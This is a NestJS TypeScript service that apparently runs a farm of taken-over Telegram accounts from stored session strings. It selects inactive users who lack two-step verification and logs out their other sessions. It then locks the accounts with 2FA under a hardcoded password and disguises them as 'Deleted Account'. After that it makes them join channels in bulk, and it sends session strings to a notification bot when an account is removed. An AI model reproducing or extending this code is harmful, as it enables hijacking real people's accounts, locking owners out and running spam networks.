import { ChannelsService } from './../channels/channels.service';
import { Channel } from './../channels/schemas/channel.schema';
import {
    BadRequestException, ConflictException, HttpException, Inject, Injectable,
    InternalServerErrorException, Logger, NotFoundException, forwardRef, OnModuleDestroy
} from '@nestjs/common';
import { InjectModel } from '@nestjs/mongoose';
import { Model } from 'mongoose';
import { CreateBufferClientDto } from './dto/create-buffer-client.dto';
import { BufferClient, BufferClientDocument } from './schemas/buffer-client.schema';
import { TelegramService } from '../Telegram/Telegram.service';
import { sleep } from 'telegram/Helpers';
import { UsersService } from '../users/users.service';
import { ActiveChannelsService } from '../active-channels/active-channels.service';
import { ClientService } from '../clients/client.service';
import { UpdateBufferClientDto } from './dto/update-buffer-client.dto';
import { PromoteClientService } from '../promote-clients/promote-client.service';
import { parseError } from '../../utils/parseError';
import { fetchWithTimeout } from '../../utils/fetchWithTimeout';
import { notifbot } from '../../utils/logbots';
import { connectionManager } from '../Telegram/utils/connection-manager';
import { SessionService } from '../session-manager';

@Injectable()
export class BufferClientService implements OnModuleDestroy {
    private readonly logger = new Logger(BufferClientService.name);
    private joinChannelMap: Map<string, Channel[]> = new Map();
    private joinChannelIntervalId: NodeJS.Timeout;
    private leaveChannelMap: Map<string, string[]> = new Map();
    private leaveChannelIntervalId: NodeJS.Timeout;
    private isJoinChannelProcessing: boolean = false;
    private isLeaveChannelProcessing: boolean = false;
    private readonly JOIN_CHANNEL_INTERVAL = 4 * 60 * 1000; // 4 minutes
    private readonly LEAVE_CHANNEL_INTERVAL = 60 * 1000; // 30 seconds
    private readonly LEAVE_CHANNEL_BATCH_SIZE = 10;

    constructor(@InjectModel('bufferClientModule') private bufferClientModel: Model<BufferClientDocument>,
        @Inject(forwardRef(() => TelegramService))
        private telegramService: TelegramService,
        @Inject(forwardRef(() => UsersService))
        private usersService: UsersService,
        @Inject(forwardRef(() => ActiveChannelsService))
        private activeChannelsService: ActiveChannelsService,
        @Inject(forwardRef(() => ClientService))
        private clientService: ClientService,
        @Inject(forwardRef(() => ActiveChannelsService))
        private channelsService: ChannelsService,
        @Inject(forwardRef(() => PromoteClientService))
        private promoteClientService: PromoteClientService,
        @Inject(forwardRef(() => SessionService))
        private sessionService: SessionService
    ) {}
    async onModuleDestroy() {
        this.logger.log('Cleaning up BufferClientService resources');
        this.clearBufferMap();
        this.clearLeaveMap();
        await connectionManager.disconnectAll();
    }

    async create(bufferClient: CreateBufferClientDto): Promise<BufferClient> {
        const newUser = new this.bufferClientModel(bufferClient);
        return newUser.save();
    }

    async findAll(): Promise<BufferClient[]> {
        return this.bufferClientModel.find().exec();
    }

    async findOne(mobile: string, throwErr: boolean = true): Promise<BufferClient> {
        const user = (await this.bufferClientModel.findOne({ mobile }).exec())?.toJSON();
        if (!user && throwErr) {
            throw new NotFoundException(`BufferClient with mobile ${mobile} not found`);
        }
        return user;
    }


    async update(mobile: string, updateClientDto: UpdateBufferClientDto): Promise<BufferClient> {
        const updatedUser = await this.bufferClientModel.findOneAndUpdate(
            { mobile },
            { $set: updateClientDto },
            { new: true, upsert: true, returnDocument: 'after' }
        ).exec();

        if (!updatedUser) {
            throw new NotFoundException(`User with mobile ${mobile} not found`);
        }

        return updatedUser;
    }

    async createOrUpdate(mobile: string, createOrUpdateUserDto: CreateBufferClientDto | UpdateBufferClientDto): Promise<BufferClient> {
        const existingUser = (await this.bufferClientModel.findOne({ mobile }).exec())?.toJSON();
        if (existingUser) {
            console.log("Updating")
            return this.update(existingUser.mobile, createOrUpdateUserDto as UpdateBufferClientDto);
        } else {
            console.log("creating")
            return this.create(createOrUpdateUserDto as CreateBufferClientDto);
        }
    }

    async remove(mobile: string): Promise<void> {
        try {
            const bufferClient = await this.findOne(mobile, false);
            if (!bufferClient) {
                throw new NotFoundException(`BufferClient with mobile ${mobile} not found`);
            }
            this.logger.log(`Removing BufferClient with mobile: ${mobile}`);
            await fetchWithTimeout(`${notifbot()}&text=${encodeURIComponent(`Deleting Buffer Client : ${mobile}\nsession: ${bufferClient.session}`)}`);
            await this.bufferClientModel.deleteOne({ mobile }).exec();
        } catch (error) {
            const errorDetails = parseError(error);
            this.logger.error(`Error removing BufferClient with mobile ${mobile}: ${errorDetails.message}`);
            throw new HttpException(errorDetails.message, errorDetails.status);
        }
        this.logger.log(`BufferClient with mobile ${mobile} removed successfully`);
    }
    async search(filter: any): Promise<BufferClient[]> {
        console.log(filter)
        if (filter.firstName) {
            filter.firstName = { $regex: new RegExp(filter.firstName, 'i') }
        }
        console.log(filter)
        return this.bufferClientModel.find(filter).exec();
    }

    async executeQuery(query: any, sort?: any, limit?: number, skip?: number): Promise<BufferClient[]> {
        try {

            if (!query) {
                throw new BadRequestException('Query is invalid.');
            }
            const queryExec = this.bufferClientModel.find(query);
            if (sort) {
                queryExec.sort(sort);
            }

            if (limit) {
                queryExec.limit(limit);
            }

            if (skip) {
                queryExec.skip(skip);
            }

            return await queryExec.exec();
        } catch (error) {
            throw new InternalServerErrorException(error.message);
        }
    }

    removeFromBufferMap(key: string) {
        this.joinChannelMap.delete(key);
    }

    clearBufferMap() {
        console.log("BufferMap cleared");
        this.joinChannelMap.clear();
        this.clearJoinChannelInterval();
    }

    async joinchannelForBufferClients(skipExisting: boolean = true): Promise<string> {
        if (!this.telegramService.getActiveClientSetup()) {
            this.logger.log('Starting join channel process');
            await connectionManager.disconnectAll();

            // Clear both queues before starting new process
            this.clearJoinChannelInterval();
            this.clearLeaveChannelInterval();

            await sleep(2000);
            const existingkeys = skipExisting ? [] : Array.from(this.joinChannelMap.keys())
            const clients = await this.bufferClientModel.find({ channels: { "$lt": 350 }, mobile: { $nin: existingkeys } }).sort({ channels: 1 }).limit(4);

            this.logger.debug(`Found ${clients.length} clients to process for joining channels`);

            if (clients.length > 0) {
                for (const document of clients) {
                    try {
                        const client = await connectionManager.getClient(document.mobile, { autoDisconnect: false, handler: false });
                        this.logger.log(`Started joining process for mobile: ${document.mobile}`);

                        const channels = await client.channelInfo(true);
                        this.logger.debug(`Client ${document.mobile} has ${channels.ids.length} existing channels`);

                        await this.update(document.mobile, { channels: channels.ids.length });
                        this.logger.debug(`Client ${document.mobile} has ${channels.canSendFalseChats.length} channels that can't send messages`);

                        let result = [];
                        if (channels.canSendFalseCount < 10) {
                            if (channels.ids.length < 220) {
                                result = await this.channelsService.getActiveChannels(150, 0, channels.ids);
                            } else {
                                result = await this.activeChannelsService.getActiveChannels(150, 0, channels.ids);
                            }
                            this.logger.debug(`Adding ${result.length} new channels to join queue for ${document.mobile}`);
                            this.joinChannelMap.set(document.mobile, result);
                            this.joinChannelQueue();
                            await connectionManager.unregisterClient(document.mobile);
                        } else {
                            this.logger.warn(`Client ${document.mobile} has too many restricted channels, moving to leave queue: ${channels.canSendFalseChats.length}`);
                            this.joinChannelMap.delete(document.mobile);
                            this.leaveChannelMap.set(document.mobile, channels.canSendFalseChats);
                            this.leaveChannelQueue();
                            await connectionManager.unregisterClient(document.mobile);

                        }
                        // console.log("DbChannelsLen: ", result.length);
                        // let resp = '';
                        // this.telegramService.joinChannels(document.mobile, result);
                    } catch (error) {
                        if (error.message === "SESSION_REVOKED" ||
                            error.message === "AUTH_KEY_UNREGISTERED" ||
                            error.message === "USER_DEACTIVATED" ||
                            error.message === "USER_DEACTIVATED_BAN") {
                            this.logger.error(`Session invalid for ${document.mobile}, removing client`, error.stack);
                            await this.remove(document.mobile);
                            await connectionManager.unregisterClient(document.mobile);
                        }
                        parseError(error)
                    }
                }
            }
            this.logger.log(`Join channel process initiated for ${clients.length} clients`);
            return `Initiated Joining channels ${clients.length}`
        } else {
            this.logger.warn('Ignored active check buffer channels as active client setup exists');
        }
    }

    async joinChannelQueue() {
        if (this.isJoinChannelProcessing || this.joinChannelIntervalId) {
            this.logger.warn('Join channel process is already running, instance:', this.joinChannelIntervalId);
            return;
        }

        const existingKeys = Array.from(this.joinChannelMap.keys());
        if (existingKeys.length === 0) {
            this.logger.debug('No channels to join, not starting queue');
            return;
        }

        this.isJoinChannelProcessing = true;
        this.joinChannelIntervalId = setInterval(async () => {
            let processTimeout: NodeJS.Timeout;
            try {
                const keys = Array.from(this.joinChannelMap.keys());
                if (keys.length === 0) {
                    this.clearJoinChannelInterval();
                    return;
                }

                // Add timeout to prevent infinite processing
                processTimeout = setTimeout(() => {
                    this.logger.error('Join channel interval processing timeout');
                    this.clearJoinChannelInterval();
                }, this.JOIN_CHANNEL_INTERVAL - 1000);

                this.logger.debug(`Processing join channel queue at ${new Date().toISOString()}, ${keys.length} clients remaining, interval:${this.joinChannelIntervalId}`);

                for (const mobile of keys) {
                    let currentChannel: Channel | null = null;
                    try {
                        const channels = this.joinChannelMap.get(mobile);
                        if (!channels || channels.length === 0) {
                            this.logger.debug(`No more channels to join for ${mobile}, removing from queue`);
                            this.removeFromBufferMap(mobile);
                            continue;
                        }

                        currentChannel = channels.shift();
                        this.logger.debug(`${mobile} has ${channels.length} pending channels to join`);
                        this.joinChannelMap.set(mobile, channels);

                        const client = await connectionManager.getClient(mobile, { autoDisconnect: false, handler: false });
                        this.logger.debug(`${mobile} attempting to join channel: @${currentChannel.username}`);
                        await this.telegramService.tryJoiningChannel(mobile, currentChannel);
                        await connectionManager.unregisterClient(mobile);
                    } catch (error: any) {
                        const errorDetails = parseError(error, `${mobile} ${currentChannel ? `@${currentChannel.username}` : ''} Outer Err ERR: `, false);
                        this.logger.error(`Error joining channel for ${mobile}: ${error.message}`);

                        if (errorDetails.error === 'FloodWaitError' || error.errorMessage === 'CHANNELS_TOO_MUCH') {
                            this.logger.warn(`${mobile} has FloodWaitError or joined too many channels, removing from queue`);
                            this.removeFromBufferMap(mobile);
                            const channelsInfo = await this.telegramService.getChannelInfo(mobile, true);
                            await this.update(mobile, { channels: channelsInfo.ids.length });
                        }

                        if (error.errorMessage === "SESSION_REVOKED" ||
                            error.errorMessage === "AUTH_KEY_UNREGISTERED" ||
                            error.errorMessage === "USER_DEACTIVATED" ||
                            error.errorMessage === "USER_DEACTIVATED_BAN" ||
                            error.errorMessage === "FROZEN_METHOD_INVALID") {
                            this.logger.error(`Session invalid for ${mobile}, removing client`);
                            this.removeFromBufferMap(mobile);
                            await this.remove(mobile);
                        }

                        try {
                            await connectionManager.unregisterClient(mobile);
                        } catch (unregisterError) {
                            this.logger.error(`Error unregistering client ${mobile}: ${unregisterError.message}`);
                        }
                    }
                }
            } catch (error) {
                this.logger.error('Error in join channel interval', error);
                this.clearJoinChannelInterval();
            } finally {
                if (processTimeout) {
                    clearTimeout(processTimeout);
                }
            }
        }, this.JOIN_CHANNEL_INTERVAL);

        this.logger.debug(`Started join channel queue with interval ID: ${this.joinChannelIntervalId}`);
    }

    clearJoinChannelInterval() {
        if (this.joinChannelIntervalId) {
            this.logger.debug(`Clearing join channel interval: ${this.joinChannelIntervalId}`);
            clearInterval(this.joinChannelIntervalId);
            this.joinChannelIntervalId = null;
            this.isJoinChannelProcessing = false;

            // Only schedule next run if there are items in the map
            if (this.joinChannelMap.size > 0) {
                setTimeout(() => {
                    this.logger.debug('Triggering next join channel process');
                    this.joinchannelForBufferClients(false);
                }, 30000);
            }
        }
    }

    removeFromLeaveMap(key: string) {
        this.leaveChannelMap.delete(key);
        if (this.leaveChannelMap.size === 0) {
            this.clearLeaveChannelInterval();
        }
    }

    clearLeaveMap() {
        console.log("LeaveMap cleared");
        this.leaveChannelMap.clear();
        this.clearLeaveChannelInterval();
    }

    async leaveChannelQueue() {
        if (this.isLeaveChannelProcessing || this.leaveChannelIntervalId) {
            this.logger.warn('Leave channel process is already running, instance:', this.leaveChannelIntervalId);
            return;
        }

        const existingKeys = Array.from(this.leaveChannelMap.keys());
        if (existingKeys.length === 0) {
            this.logger.debug('No channels to leave, not starting queue');
            return;
        }

        this.isLeaveChannelProcessing = true;
        this.leaveChannelIntervalId = setInterval(async () => {
            let processTimeout: NodeJS.Timeout;
            try {
                const keys = Array.from(this.leaveChannelMap.keys());
                if (keys.length === 0) {
                    this.logger.debug('Leave map is empty, clearing interval');
                    this.clearLeaveChannelInterval();
                    return;
                }

                // Add timeout to prevent infinite processing
                processTimeout = setTimeout(() => {
                    this.logger.error('Leave channel interval processing timeout');
                    this.clearLeaveChannelInterval();
                }, this.LEAVE_CHANNEL_INTERVAL - 1000);

                this.logger.debug(`Processing leave channel queue at ${new Date().toISOString()}, ${keys.length} clients remaining, interval:${this.leaveChannelIntervalId}`);

                for (const mobile of keys) {
                    try {
                        const channels = this.leaveChannelMap.get(mobile);
                        if (!channels || channels.length === 0) {
                            this.logger.debug(`No more channels to leave for ${mobile}, removing from queue`);
                            this.removeFromLeaveMap(mobile);
                            continue;
                        }

                        const channelsToProcess = channels.splice(0, this.LEAVE_CHANNEL_BATCH_SIZE);
                        this.logger.debug(`${mobile} has ${channels.length} pending channels to leave`);

                        // Only update map if there are remaining channels
                        if (channels.length > 0) {
                            this.leaveChannelMap.set(mobile, channels);
                        } else {
                            this.removeFromLeaveMap(mobile);
                        }

                        const client = await connectionManager.getClient(mobile, { autoDisconnect: false, handler: false });
                        this.logger.debug(`${mobile} attempting to leave ${channelsToProcess.length} channels`);
                        await client.leaveChannels(channelsToProcess);
                        this.logger.debug(`${mobile} left channels successfully`);
                        await connectionManager.unregisterClient(mobile);
                    } catch (error: any) {
                        const errorDetails = parseError(error, `${mobile} Leave Channel ERR: `, false);
                        if (
                            errorDetails.message === "SESSION_REVOKED" ||
                            errorDetails.message === "AUTH_KEY_UNREGISTERED" ||
                            errorDetails.message === "USER_DEACTIVATED" ||
                            errorDetails.message === "USER_DEACTIVATED_BAN"
                        ) {
                            this.logger.error(`Session invalid for ${mobile}, removing client`);
                            await this.remove(mobile);
                            this.removeFromLeaveMap(mobile);
                        }

                        try {
                            await connectionManager.unregisterClient(mobile);
                        } catch (unregisterError) {
                            this.logger.error(`Error unregistering client ${mobile}: ${unregisterError.message}`);
                        }
                    }
                }
            } catch (error) {
                this.logger.error('Error in leave channel interval', error);
                this.clearLeaveChannelInterval();
            } finally {
                if (processTimeout) {
                    clearTimeout(processTimeout);
                }
            }
        }, this.LEAVE_CHANNEL_INTERVAL);

        this.logger.debug(`Started leave channel queue with interval ID: ${this.leaveChannelIntervalId}`);
    }

    clearLeaveChannelInterval() {
        if (this.leaveChannelIntervalId) {
            this.logger.debug(`Clearing leave channel interval: ${this.leaveChannelIntervalId}`);
            clearInterval(this.leaveChannelIntervalId);
            this.leaveChannelIntervalId = null;
        }
        this.isLeaveChannelProcessing = false;
        this.logger.debug('Leave channel interval cleared and processing flag reset');
    }

    async setAsBufferClient(
        mobile: string,
        availableDate: string = (new Date(Date.now() - (24 * 60 * 60 * 1000))).toISOString().split('T')[0]
    ) {
        const user = (await this.usersService.search({ mobile }))[0];
        if (!user) {
            throw new BadRequestException('user not found');
        }
        const isExist = await this.findOne(mobile, false)
        if (isExist) {
            throw new ConflictException('BufferClient already exist');
        }
        const clients = await this.clientService.findAll();
        const clientMobiles = clients.map(client => client?.mobile);
        const clientPromoteMobiles = clients.flatMap(client => client?.promoteMobile);
        if (!clientPromoteMobiles.includes(mobile) && !clientMobiles.includes(mobile)) {
            try {
                const telegramClient = await connectionManager.getClient(mobile, { autoDisconnect: false })
                await telegramClient.set2fa();
                await sleep(15000)
                await telegramClient.updateUsername('');
                await sleep(3000)
                await telegramClient.updatePrivacyforDeletedAccount();
                await sleep(3000)
                await telegramClient.updateProfile("Deleted Account", "Deleted Account");
                await sleep(3000)
                await telegramClient.deleteProfilePhotos();
                const channels = await this.telegramService.getChannelInfo(mobile, true)
                const bufferClient = {
                    tgId: user.tgId,
                    session: user.session,
                    mobile: user.mobile,
                    availableDate,
                    channels: channels.ids.length,
                }
                await this.bufferClientModel.findOneAndUpdate({ tgId: user.tgId }, { $set: bufferClient }, { new: true, upsert: true }).exec();
            } catch (error) {
                const errorDetails = parseError(error)
                throw new HttpException(errorDetails.message, errorDetails.status)
            }
            await connectionManager.unregisterClient(mobile)
            return "Client set as buffer successfully";
        } else {
            throw new BadRequestException("Number is a Active Client")
        }
    }

    async checkBufferClients() {
        if (!this.telegramService.getActiveClientSetup()) {
            await connectionManager.disconnectAll();
            await sleep(2000);
            const bufferclients = await this.findAll();
            let goodIds: string[] = [];
            const badIds: string[] = [];
            if (bufferclients.length < 70) {
                for (let i = 0; i < 70 - bufferclients.length; i++) {
                    badIds.push(i.toString());
                }
            }
            const clients = await this.clientService.findAll();
            const promoteclients = await this.promoteClientService.findAll();
            const clientIds = [...clients.map(client => client.mobile), ...clients.flatMap(client => client.promoteMobile)].filter(Boolean);
            const promoteclientIds = promoteclients.map(client => client.mobile);
            const today = (new Date(Date.now())).toISOString().split('T')[0];

            for (const document of bufferclients) {
                if (!clientIds.includes(document.mobile) && !promoteclientIds.includes(document.mobile)) {
                    try {
                        const cli = await connectionManager.getClient(document.mobile, { autoDisconnect: true, handler: false });
                        try {
                            const me = await cli.getMe();
                            if (me.username) {
                                await this.telegramService.updateUsername(document.mobile, '');
                                await sleep(2000);
                            }
                            if (me.firstName !== "Deleted Account") {
                                await this.telegramService.updateNameandBio(document.mobile, 'Deleted Account', '');
                                await sleep(2000);
                            }
                            await this.telegramService.deleteProfilePhotos(document.mobile);
                            const hasPassword = await cli.hasPassword();
                            if (!hasPassword) {
                                this.logger.warn("Client does not have password");
                                badIds.push(document.mobile);
                            } else {
                                this.logger.debug(document.mobile + " : ALL Good");
                                goodIds.push(document.mobile);
                            }
                        } catch (innerError: any) {
                            this.logger.error(`Error processing client ${document.mobile}: ${innerError.message}`);
                            badIds.push(document.mobile);
                            await this.remove(document.mobile);
                        } finally {
                            await connectionManager.unregisterClient(document.mobile);
                        }
                        await sleep(2000);
                    } catch (error: any) {
                        this.logger.error(`Error with client ${document.mobile}: ${error.message}`);
                        parseError(error);
                        badIds.push(document.mobile);
                        await this.remove(document.mobile);
                        try {
                            await connectionManager.unregisterClient(document.mobile);
                        } catch (unregisterError) {
                            this.logger.error(`Error unregistering client ${document.mobile}: ${unregisterError.message}`);
                        }
                    }
                } else {
                    this.logger.warn("Number is a Active Client");
                    goodIds.push(document.mobile);
                    await this.remove(document.mobile);
                }
            }
            goodIds = [...new Set([...goodIds, ...clientIds, ...promoteclientIds])];
            this.logger.debug(`GoodIds: ${goodIds.length}, BadIds: ${badIds.length}`);
            await this.addNewUserstoBufferClients(badIds, goodIds);
        } else {
            this.logger.warn("Ignored active check buffer channels as active client setup exists");
        }
    }

    async addNewUserstoBufferClients(badIds: string[], goodIds: string[]) {
        const sixMonthsAgo = (new Date(Date.now() - 3 * 30 * 24 * 60 * 60 * 1000)).toISOString().split('T')[0];
        const documents = await this.usersService.executeQuery(
            {
                mobile: { $nin: goodIds },
                expired: false,
                twoFA: false,
                lastActive: { $lt: sixMonthsAgo },
                totalChats: { $gt: 250 }
            },
            { tgId: 1 },
            badIds.length + 3
        );

        this.logger.debug(`New buffer documents to be added: ${documents.length}`);

        while (badIds.length > 0 && documents.length > 0) {
            const document = documents.shift();
            if (!document || !document.mobile || !document.tgId || !document.session) {
                this.logger.warn('Invalid document found, skipping');
                continue;
            }

            try {
                const client = await connectionManager.getClient(document.mobile, { autoDisconnect: false });
                try {
                    const hasPassword = await client.hasPassword();
                    this.logger.debug(`hasPassword for ${document.mobile}: ${hasPassword}`);

                    if (!hasPassword) {
                        await client.removeOtherAuths();
                        await client.set2fa();
                        this.logger.debug("Waiting for setting 2FA");
                        await sleep(30000);

                        await client.updateUsername('');
                        await sleep(3000);

                        await client.updatePrivacyforDeletedAccount();
                        await sleep(3000);

                        await client.updateProfile("Deleted Account", "Deleted Account");
                        await sleep(3000);

                        await client.deleteProfilePhotos();
                        await sleep(2000);

                        await this.telegramService.removeOtherAuths(document.mobile);
                        const channels = await client.channelInfo(true);

                        this.logger.debug("Creating buffer client document");
                        const bufferClient = {
                            tgId: document.tgId,
                            session: document.session,
                            mobile: document.mobile,
                            availableDate: (new Date(Date.now() - (24 * 60 * 60 * 1000))).toISOString().split('T')[0],
                            channels: channels.ids.length,
                        };
                        await this.sessionService.createSession({ mobile: document.mobile, password: 'Ajtdmwajt1@' });
                        await this.create(bufferClient);
                        await this.usersService.update(document.tgId, { twoFA: true });
                        this.logger.debug("=============Created BufferClient=============");
                        badIds.pop();
                    } else {
                        this.logger.warn("Failed to Update as BufferClient has Password");
                        await this.usersService.update(document.tgId, { twoFA: true });
                    }
                } catch (error: any) {
                    this.logger.error(`Error processing client ${document.mobile}: ${error.message}`);
                    parseError(error);
                } finally {
                    try {
                        await connectionManager.unregisterClient(document.mobile);
                    } catch (unregisterError: any) {
                        this.logger.error(`Error unregistering client ${document.mobile}: ${unregisterError.message}`);
                    }
                }
            } catch (error: any) {
                this.logger.error(`Error creating client connection for ${document.mobile}: ${error.message}`);
                parseError(error);
            }
        }

        // Schedule next join channel process
        setTimeout(() => {
            this.joinchannelForBufferClients();
        }, 2 * 60 * 1000);
    }
}
